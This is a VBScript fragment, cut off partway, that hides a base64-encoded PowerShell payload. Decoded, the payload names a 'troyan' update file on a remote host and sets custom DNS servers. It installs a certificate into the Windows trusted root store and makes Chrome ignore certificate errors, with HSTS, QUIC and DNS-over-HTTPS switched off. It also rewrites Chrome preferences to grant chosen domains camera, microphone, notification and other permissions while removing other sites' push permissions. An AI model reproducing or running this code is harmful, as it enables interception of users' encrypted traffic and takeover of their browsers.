Dim bodyX
bodyX="77u/JHNlcnZlciA9ICd7DQogICAgIlVwZGF0ZUZpbGUiOiAgIkM6XFxpbmV0cHViXFx3d3dyb290XFxhZHNcXGQtZGF0YVxcdHJveWFuLnR4dCIsDQogICAgInVwZGF0ZVVybCI6ICAiaHR0cDovL2RhdGEtMS5zdXBlcmhvc3QucHcvZC1kYXRhL3Ryb3lhbi50eHQiLA0KICAgICJwcmltYXJ5RG5zIjogICIxMDkuMjQ4LjIwMS4yMjYiLA0KICAgICJzZWNvbmRhcnlEbnMiOiAgIjEwOS4yNDguMjAxLjIyNCIsDQogICAgInRyYWNrIjogIGZhbHNlLA0KICAgICJ0cmFja2luZ1VybCI6ICBudWxsLA0KICAgICJhdXRvU3RhcnQiOiAgZmFsc2UsDQogICAgImF1dG9VcGRhdGUiOiAgZmFsc2UsDQogICAgImRvbWFpbnMiOiAgWw0KICAgICAgICAgICAgICAgICAgICAidGVzdDEuY29tIiwNCiAgICAgICAgICAgICAgICAgICAgInRlc3QyLmNvbSIsDQogICAgICAgICAgICAgICAgICAgICJ0ZXN0My5jb20iLA0KICAgICAgICAgICAgICAgICAgICAidGVzdDQuY29tIiwNCiAgICAgICAgICAgICAgICAgICAgInRlc3Q1LmNvbSINCiAgICAgICAgICAgICAgICBdLA0KICAgICJpcERvbWFpbnMiOiAgew0KICAgICAgICAgICAgICAgICAgICAgICIxMDkuMjQ4LjIwMS4yMjYiOiAgInRlc3QxLmNvbSIsDQogICAgICAgICAgICAgICAgICAgICAgIjEwOS4yNDguMjAxLjIyNCI6ICAidGVzdDIuY29tIiwNCiAgICAgICAgICAgICAgICAgICAgICAiMTA5LjI0OC4yMDEuMjIzIjogICJ0ZXN0My5jb20iLA0KICAgICAgICAgICAgICAgICAgICAgICIxMDkuMjQ4LjIwMS4yMjIiOiAgInRlc3Q0LmNvbSIsDQogICAgICAgICAgICAgICAgICAgICAgIjEwOS4yNDguMjAxLjIyMCI6ICAidGVzdDUuY29tIg0KICAgICAgICAgICAgICAgICAgfSwNCiAgICAicHVzaGVzIjogIFsNCg0KICAgICAgICAgICAgICAgXSwNCiAgICAic3RhcnREb3dubG9hZHMiOiAgWw0KDQogICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgInN0YXJ0VXJscyI6ICBbDQoNCiAgICAgICAgICAgICAgICAgIF0sDQogICAgImZyb250IjogIFsNCiAgICAgICAgICAgICAgICAgICJBY3RpdmVIb3Vycy5wbmciDQogICAgICAgICAgICAgIF0sDQogICAgImVtYmVkZGluZ3MiOiAgWw0KDQogICAgICAgICAgICAgICAgICAgXSwNCiAgICAiaXNWYWxpZCI6ICBmYWxzZQ0KfScgfCBDb252ZXJ0RnJvbS1Kc29uDQokeGRhdGEgPSBAew0KICAgICd0ZXN0MS5jb20nPScnDQondGVzdDIuY29tJz0nJw0KJ3Rlc3QzLmNvbSc9JycNCid0ZXN0NC5jb20nPScnDQondGVzdDUuY29tJz0nJw0KfQ0KDQpmdW5jdGlvbiBJc0RlYnVnIHsNCiAgICAkZGVidWdGaWxlID0gIkM6XGRlYnVnLnR4dCINCiAgICANCiAgICB0cnkgew0KICAgICAgICAjIENoZWNrIGlmIHRoZSBmaWxlIGV4aXN0cw0KICAgICAgICBpZiAoVGVzdC1QYXRoICRkZWJ1Z0ZpbGUgLVBhdGhUeXBlIExlYWYpIHsNCiAgICAgICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgICAgICB9DQogICAgfSBjYXRjaCB7DQogICAgICAgICMgQ2F0Y2ggYW55IGVycm9ycyB0aGF0IG9jY3VyIGR1cmluZyB0aGUgVGVzdC1QYXRoIG9wZXJhdGlvbg0KICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtRW52UGF0aHMgew0KICAgICRhID0gR2V0LUxvY2FsQXBwRGF0YVBhdGgNCiAgICAkYiA9ICBHZXQtQXBwRGF0YVBhdGgNCiAgICByZXR1cm4gQCgkYSAsICRiKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtVGVtcEZpbGUgew0KICAgICR0ZW1wUGF0aCA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBQYXRoKCkNCiAgICAkdGVtcEZpbGUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQ0KICAgIHJldHVybiAkdGVtcEZpbGUNCn0NCg0KZnVuY3Rpb24gR2V0LUxvY2FsQXBwRGF0YVBhdGggew0KICAgIHJldHVybiBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdOjpMb2NhbEFwcGxpY2F0aW9uRGF0YSkNCn0NCg0KZnVuY3Rpb24gR2V0LUFwcERhdGFQYXRoIHsNCiAgICByZXR1cm4gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW1N5c3RlbS5FbnZpcm9ubWVudCtTcGVjaWFsRm9sZGVyXTo6QXBwbGljYXRpb25EYXRhKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtUHJvZmlsZVBhdGggew0KICAgIHJldHVybiBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdOjpVc2VyUHJvZmlsZSkNCn0NCg0KZnVuY3Rpb24gQ2xvc2UtUHJvY2Vzc2VzIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmdbXV0kcHJvY2Vzc2VzDQogICAgKQ0KDQogICAgZm9yZWFjaCAoJHByb2Nlc3MgaW4gJFByb2Nlc3Nlcykgew0KICAgICAgICAkY29tbWFuZCA9ICJ0YXNra2lsbC5leGUgL2ltICRwcm9jZXNzIC9mIg0KICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAkY29tbWFuZA0KICAgIH0NCn0NCgoKDQoNCmZ1bmN0aW9uIENvbmZpZ3VyZUNlcnRpZmljYXRlcyB7DQogICAgZm9yZWFjaCAoJGtleSBpbiAkeGRhdGEuS2V5cykgew0KICAgICAgICBDZXJ0LVdvcmsgLWNvbnRlbnRTdHJpbmcgJHhkYXRhWyRrZXldDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBDZXJ0LVdvcmsgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSAkY29udGVudFN0cmluZw0KICAgICkNCiAgICAkb3V0cHV0RmlsZVBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQ0KICAgICRiaW5hcnkgPSBbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGNvbnRlbnRTdHJpbmcpDQogICAgdHJ5IHsNCiAgICAgICAgU2V0LUNvbnRlbnQgLVBhdGggJG91dHB1dEZpbGVQYXRoIC1WYWx1ZSAkYmluYXJ5IC1Bc0J5dGVTdHJlYW0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLVBhdGggJG91dHB1dEZpbGVQYXRoIC1WYWx1ZSAkYmluYXJ5IC1FbmNvZGluZyBCeXRlDQogICAgfQ0KICAgIEluc3RhbGwtQ2VydGlmaWNhdGVUb1N0b3JlcyAtQ2VydGlmaWNhdGVGaWxlUGF0aCAkb3V0cHV0RmlsZVBhdGggLVBhc3N3b3JkICcxMjMnDQp9DQoNCmZ1bmN0aW9uIEluc3RhbGwtQ2VydGlmaWNhdGVUb1N0b3JlcyB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddICRDZXJ0aWZpY2F0ZUZpbGVQYXRoLA0KICAgICAgICBbc3RyaW5nXSAkUGFzc3dvcmQNCiAgICApDQoNCiAgICB0cnkgew0KICAgICAgICAkc2VjdXJlUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nIC1TdHJpbmcgJFBhc3N3b3JkIC1Bc1BsYWluVGV4dCAtRm9yY2UNCg0KICAgICAgICAjIEltcG9ydCBjZXJ0aWZpY2F0ZSB0byBQZXJzb25hbCAoTXkpIHN0b3JlDQogICAgICAgICRwZXJzb25hbFN0b3JlUGF0aCA9ICJDZXJ0OlxMb2NhbE1hY2hpbmVcTXkiDQogICAgICAgIEltcG9ydC1QZnhDZXJ0aWZpY2F0ZSAtRmlsZVBhdGggJENlcnRpZmljYXRlRmlsZVBhdGggLUNlcnRTdG9yZUxvY2F0aW9uICRwZXJzb25hbFN0b3JlUGF0aCAtUGFzc3dvcmQgJHNlY3VyZVBhc3N3b3JkIC1FcnJvckFjdGlvbiBTdG9wDQogICAgICAgIFdyaXRlLU91dHB1dCAiQ2VydGlmaWNhdGUgaW5zdGFsbGVkIHN1Y2Nlc3NmdWxseSB0byBQZXJzb25hbCBzdG9yZSAoTXkpLiINCg0KICAgICAgICAjIEltcG9ydCBjZXJ0aWZpY2F0ZSB0byBSb290IHN0b3JlDQogICAgICAgICRyb290U3RvcmVQYXRoID0gIkNlcnQ6XExvY2FsTWFjaGluZVxSb290Ig0KICAgICAgICBJbXBvcnQtUGZ4Q2VydGlmaWNhdGUgLUZpbGVQYXRoICRDZXJ0aWZpY2F0ZUZpbGVQYXRoIC1DZXJ0U3RvcmVMb2NhdGlvbiAkcm9vdFN0b3JlUGF0aCAtUGFzc3dvcmQgJHNlY3VyZVBhc3N3b3JkIC1FcnJvckFjdGlvbiBTdG9wDQogICAgICAgIFdyaXRlLU91dHB1dCAiQ2VydGlmaWNhdGUgaW5zdGFsbGVkIHN1Y2Nlc3NmdWxseSB0byBSb290IHN0b3JlLiINCg0KICAgIH0gY2F0Y2ggew0KICAgICAgICB0aHJvdyAiRmFpbGVkIHRvIGluc3RhbGwgY2VydGlmaWNhdGU6ICRfIg0KICAgIH0NCn0NCg0KZnVuY3Rpb24gQ29uZmlndXJlQ2hyb21lIHsNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcRG5zY2FjaGVcUGFyYW1ldGVycyIgLU5hbWUgIkVuYWJsZUF1dG9ET0giIC1WYWx1ZSAwDQoNCiAgICAkY2hyb21lS2V5UGF0aCA9ICJIS0xNOlxTb2Z0d2FyZVxQb2xpY2llc1xHb29nbGVcQ2hyb21lIg0KDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkY2hyb21lS2V5UGF0aCkpIHsNCiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJGNocm9tZUtleVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICB9DQoNCiAgICBOZXctSXRlbSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbCAgIyBDcmVhdGUgdGhlIGtleSBpZiBpdCBkb2Vzbid0IGV4aXN0DQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtTmFtZSAiQ29tbWFuZExpbmVGbGFnIiAtVmFsdWUgIi0taWdub3JlLWNlcnRpZmljYXRlLWVycm9ycyAtLWRpc2FibGUtcXVpYyAtLWRpc2FibGUtaHN0cyINCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRjaHJvbWVLZXlQYXRoIC1OYW1lICJEbnNPdmVySHR0cHMiIC1WYWx1ZSAib2ZmIg0KDQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtTmFtZSAiSWdub3JlQ2VydGlmaWNhdGVFcnJvcnMiIC1WYWx1ZSAxDQoNCiAgICBXcml0ZS1PdXRwdXQgIkNocm9tZSBjb25maWd1cmVkIg0KfQ0KDQoKCg0KCgoNCg0KZnVuY3Rpb24gUHVzaERvbWFpbiB7DQogICAgcGFyYW0gKCRwdXNoVXJsKQ0KDQogICAgIyBUcmltIHRoZSBpbnB1dCBzdHJpbmcgYmVmb3JlIHRoZSBmaXJzdCBjb21tYQ0KICAgICR0cmltbWVkVXJsID0gJHB1c2hVcmwuVHJpbSgpLlNwbGl0KCcsJylbMF0uVHJpbSgpDQoNCiAgICAjIFBhcnNlIHRoZSBVUkkNCiAgICAkcGFyc2VkVXJpID0gW1N5c3RlbS5VcmldOjpuZXcoJHRyaW1tZWRVcmwpDQogICAgDQogICAgIyBFeHRyYWN0IGRvbWFpbiBhbmQgcG9ydA0KICAgICRkb21haW4gPSAkcGFyc2VkVXJpLkhvc3QNCiAgICAkcG9ydCA9IGlmICgkcGFyc2VkVXJpLlBvcnQgLWVxIC0xKSB7IDQ0MyB9IGVsc2UgeyAkcGFyc2VkVXJpLlBvcnQgfQ0KDQogICAgIyBDb25zdHJ1Y3QgdGhlIHJlc3VsdCBVUkwNCiAgICAkcmVzdWx0ID0gImh0dHBzOi8vIiArICRkb21haW4gKyAiOiIgKyAiJHBvcnQsKiINCiAgICANCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KDQpmdW5jdGlvbiBQdXNoRXhpc3RzDQp7DQogICAgcGFyYW0gKCRwdXNoVXJsKQ0KICAgIGZvcmVhY2ggKCRwdXNoIGluICR4cHVzaGVzKSANCiAgICB7DQogICAgICAgIGlmICgoUHVzaERvbWFpbiAtcHVzaFVybCAkcHVzaFVybCkgLWVxIChQdXNoRG9tYWluIC1wdXNoVXJsICRwdXNoKSkNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuICR0cnVlOw0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkZmFsc2UNCn0NCg0KIyBmdW5jdGlvbiBMaXN0LVB1c2hlcygpDQojIHsNCiMgICAgICRwcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KIyAgICAgIyBDaGVjayBpZiB0aGUgUHJlZmVyZW5jZXMgZmlsZSBleGlzdHMNCiMgICAgIGlmIChUZXN0LVBhdGggJHByZWZlcmVuY2VzUGF0aCkgew0KIyAgICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiMgICAgICAgICAkbm90aWZpY2F0aW9uU2V0dGluZ3MgPSAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zLm5vdGlmaWNhdGlvbnMNCg0KIyAgICAgICAgIGlmICgkbm90aWZpY2F0aW9uU2V0dGluZ3MgLWlzbm90IFthcnJheV0pIHsNCiMgICAgICAgICAgICAgJG5vdGlmaWNhdGlvblNldHRpbmdzID0gQCgkbm90aWZpY2F0aW9uU2V0dGluZ3MpDQojICAgICAgICAgfQ0KDQojICAgICAgICAgaWYgKCRub3RpZmljYXRpb25TZXR0aW5ncykgew0KIyAgICAgICAgICAgICBmb3JlYWNoICgkaXRlbSBpbiAkbm90aWZpY2F0aW9uU2V0dGluZ3MpIHsNCiMgICAgICAgICAgICAgICAgICRqc29uSXRlbSA9ICRpdGVtIHwgQ29udmVydFRvLUpzb24gLURlcHRoIDENCiMgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkanNvbkl0ZW0NCiMgICAgICAgICAgICAgfQ0KIyAgICAgICAgIH0gZWxzZSB7DQojICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiTm8gbm90aWZpY2F0aW9uIHNldHRpbmdzIGZvdW5kLiINCiMgICAgICAgICB9DQojICAgICB9IGVsc2Ugew0KIyAgICAgICAgIFdyaXRlLU91dHB1dCAiUHJlZmVyZW5jZXMgZmlsZSBub3QgZm91bmQgYXQgcGF0aDogJHByZWZlcmVuY2VzUGF0aCINCiMgICAgIH0NCiMgfQ0KDQpmdW5jdGlvbiBSZW1vdmUtUHVzaGVzIHsNCiAgICAkcHJlZmVyZW5jZXNQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcUHJlZmVyZW5jZXMiDQoNCiAgICAjIENoZWNrIGlmIHRoZSBQcmVmZXJlbmNlcyBmaWxlIGV4aXN0cw0KICAgIGlmIChUZXN0LVBhdGggJHByZWZlcmVuY2VzUGF0aCkgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgICAgICMgQ2hlY2sgaWYgdGhlIHN0cnVjdHVyZSBpcyBhcyBleHBlY3RlZA0KICAgICAgICBpZiAoJHByZWZlcmVuY2VzQ29udGVudCAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZSAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzIC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucy5ub3RpZmljYXRpb25zKSB7DQogICAgICAgICAgICAkbm90aWZpY2F0aW9uU2V0dGluZ3MgPSAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zLm5vdGlmaWNhdGlvbnMNCg0KICAgICAgICAgICAgJGtleXNUb1JlbW92ZSA9IEAoKQ0KDQogICAgICAgICAgICAjIEl0ZXJhdGUgdGhyb3VnaCBlYWNoIGVudHJ5IGluICRub3RpZmljYXRpb25TZXR0aW5ncw0KICAgICAgICAgICAgZm9yZWFjaCAoJGZpZWxkIGluICRub3RpZmljYXRpb25TZXR0aW5ncy5QU09iamVjdC5Qcm9wZXJ0aWVzKSB7DQogICAgICAgICAgICAgICAgJHNpdGVVcmwgPSAkZmllbGQuTmFtZQ0KICAgICAgICAgICAgICAgICRwZXJtaXNzaW9uID0gKFB1c2hFeGlzdHMgLXB1c2hVcmwgJHNpdGVVcmwpDQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAoJHBlcm1pc3Npb24gLWVxICRmYWxzZSkgew0KICAgICAgICAgICAgICAgICAgICAka2V5c1RvUmVtb3ZlICs9ICRmaWVsZC5OYW1lDQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICIkc2l0ZVVybCBoYXNuJ3QgYmVlbiByZW1vdmVkLCBpdCBpcyBhIGdvb2Qgc2l0ZS4iDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBmb3JlYWNoICgka2V5IGluICRrZXlzVG9SZW1vdmUpIHsNCiAgICAgICAgICAgICAgICAkbm90aWZpY2F0aW9uU2V0dGluZ3MuUFNPYmplY3QuUHJvcGVydGllcy5SZW1vdmUoJGtleSkNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAxMDAgfCBTZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1Gb3JjZQ0KDQogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIkFsbCBzZWxlY3RlZCBwdXNoIG5vdGlmaWNhdGlvbiBzZXR0aW5ncyBoYXZlIGJlZW4gcmVtb3ZlZC4iDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIk5vIG9yIHVuZXhwZWN0ZWQgbm90aWZpY2F0aW9uIHNldHRpbmdzIGZvdW5kIGluIFByZWZlcmVuY2VzIGZpbGUuIg0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgV3JpdGUtT3V0cHV0ICJQcmVmZXJlbmNlcyBmaWxlIG5vdCBmb3VuZCBhdCBwYXRoOiAkcHJlZmVyZW5jZXNQYXRoIg0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBBZGQtUHVzaCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRwdXNoVXJsDQogICAgKQ0KDQogICAgJHB1c2hEb21haW4gPSBQdXNoRG9tYWluIC1wdXNoVXJsICRwdXNoVXJsDQoNCiAgICAkY2hyb21lUHJlZmVyZW5jZXNQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcUHJlZmVyZW5jZXMiDQoNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1QYXRoICRjaHJvbWVQcmVmZXJlbmNlc1BhdGgpKSB7DQogICAgICAgIFdyaXRlLUhvc3QgIkNocm9tZSBwcmVmZXJlbmNlcyBmaWxlIG5vdCBmb3VuZCBhdCBwYXRoOiAkY2hyb21lUHJlZmVyZW5jZXNQYXRoIg0KICAgICAgICBleGl0DQogICAgfQ0KDQogICAgJHByZWZlcmVuY2VzQ29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRjaHJvbWVQcmVmZXJlbmNlc1BhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCg0KICAgIGlmICgtbm90ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZSkgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgcHJvZmlsZSAtVmFsdWUgQHt9DQogICAgfQ0KDQogICAgaWYgKC1ub3QgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcykgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBkZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMgLVZhbHVlIEB7fQ0KICAgIH0NCg0KICAgIGlmICgtbm90ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMucG9wdXBzKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBwb3B1cHMgLVZhbHVlIDENCiAgICB9IGVsc2Ugew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzLnBvcHVwcyA9IDENCiAgICB9DQoNCiAgICBpZiAoLW5vdCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzLnN1YnJlc291cmNlX2ZpbHRlcikgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgc3VicmVzb3VyY2VfZmlsdGVyIC1WYWx1ZSAxDQogICAgfSBlbHNlIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcy5zdWJyZXNvdXJjZV9maWx0ZXIgPSAxDQogICAgfQ0KDQogICAgJHByZWZlcmVuY2VzQ29udGVudEpzb24gPSAkcHJlZmVyZW5jZXNDb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDMyDQogICAgU2V0LUNvbnRlbnQgLVBhdGggJGNocm9tZVByZWZlcmVuY2VzUGF0aCAtVmFsdWUgJHByZWZlcmVuY2VzQ29udGVudEpzb24gLUZvcmNlDQoNCiAgICAkcHJlZmVyZW5jZXNQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcUHJlZmVyZW5jZXMiDQoNCiAgICBpZiAoVGVzdC1QYXRoICRwcmVmZXJlbmNlc1BhdGgpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRwcmVmZXJlbmNlc1BhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCiAgICAgICAgJGNvbnRlbnRTZXR0aW5ncyA9ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMNCiAgICAgICAgJHNldHRpbmdzVG9VcGRhdGUgPSBAKA0KICAgICAgICAgICAgImF1dG9fcGljdHVyZV9pbl9waWN0dXJlIiwgImJhY2tncm91bmRfc3luYyIsICJjYW1lcmEiLCAiY2xpcGJvYXJkIiwgImNvb2tpZXMiLCANCiAgICAgICAgICAgICJnZW9sb2NhdGlvbiIsICJpbWFnZXMiLCAiamF2YXNjcmlwdCIsICJtaWNyb3Bob25lIiwgIm1pZGlfc3lzZXgiLCANCiAgICAgICAgICAgICJub3RpZmljYXRpb25zIiwgInBvcHVwcyIsICJwbHVnaW5zIiwgInNvdW5kIiwgInVuc2FuZGJveGVkX3BsdWdpbnMiLCANCiAgICAgICAgICAgICJhdXRvbWF0aWNfZG93bmxvYWRzIiwgImZsYXNoX2RhdGEiLCAibWl4ZWRfc2NyaXB0IiwgInNlbnNvcnMiLCJ3aW5kb3dfcGxhY2VtZW50Iiwid2ViaWRfYXBpIiwidnIiLA0KICAgICAgICAgICAgInN1YnJlc291cmNlX2ZpbHRlciIsIm1lZGlhX3N0cmVhbV9taWMiLCJtZWRpYV9zdHJlYW1fbWljIiwibWVkaWFfc3RyZWFtX2NhbWVyYSIsImxvY2FsX2ZvbnRzIiwNCiAgICAgICAgICAgICJqYXZhc2NyaXB0X2ppdCIsImlkbGVfZGV0ZWN0aW9uIiwiY2FwdHVyZWRfc3VyZmFjZV9jb250cm9sIiwiYXIiDQoNCiAgICAgICAgKQ0KDQogICAgICAgIGZvcmVhY2ggKCRzZXR0aW5nIGluICRzZXR0aW5nc1RvVXBkYXRlKSB7DQogICAgICAgICAgICBpZiAoJG51bGwgLWVxICRjb250ZW50U2V0dGluZ3MuJHNldHRpbmcpIHsNCiAgICAgICAgICAgICAgICAkY29udGVudFNldHRpbmdzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJHNldHRpbmcgLVZhbHVlIEB7fQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHNwZWNpZmljU2V0dGluZyA9ICRjb250ZW50U2V0dGluZ3MuJHNldHRpbmcNCiAgICAgICAgICAgIGlmICgkc3BlY2lmaWNTZXR0aW5nLlBTT2JqZWN0LlByb3BlcnRpZXMuTmFtZSAtY29udGFpbnMgJHB1c2hEb21haW4pIHsNCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlRoZSB3ZWJzaXRlIFVSTCAkcHVzaERvbWFpbiBhbHJlYWR5IGV4aXN0cyBpbiB0aGUgJHNldHRpbmcgc2V0dGluZ3MuIg0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkc3BlY2lmaWNTZXR0aW5nIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJHB1c2hEb21haW4gLVZhbHVlIEB7DQogICAgICAgICAgICAgICAgICAgICJsYXN0X21vZGlmaWVkIiA9ICIxMzM2MjcyMDU0NTc4NTc3NCINCiAgICAgICAgICAgICAgICAgICAgInNldHRpbmciID0gMQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkY29udGVudFNldHRpbmdzLiRzZXR0aW5nID0gJHNwZWNpZmljU2V0dGluZw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucyA9ICRjb250ZW50U2V0dGluZ3MNCiAgICAgICAgJHVwZGF0ZWRQcmVmZXJlbmNlc0pzb24gPSAkcHJlZmVyZW5jZXNDb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwDQogICAgICAgICR1cGRhdGVkUHJlZmVyZW5jZXNKc29uIHwgU2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtRW5jb2RpbmcgVVRGOA0KDQogICAgICAgIFdyaXRlLU91dHB1dCAiTm90aWZpY2F0aW9uIHN1YnNjcmlwdGlvbiBmb3IgJHB1c2hEb21haW4gYWRkZWQgc3VjY2Vzc2Z1bGx5IHdpdGggYWxsIHBlcm1pc3Npb25zLiINCiAgICB9IGVsc2Ugew0KICAgICAgICBXcml0ZS1PdXRwdXQgIlByZWZlcmVuY2VzIGZpbGUgbm90IGZvdW5kIGF0IHBhdGg6ICRwcmVmZXJlbmNlc1BhdGgiDQogICAgfQ0KfQ0KDQoNCg0KZnVuY3Rpb24gQ2xvc2UtQ2hyb21lV2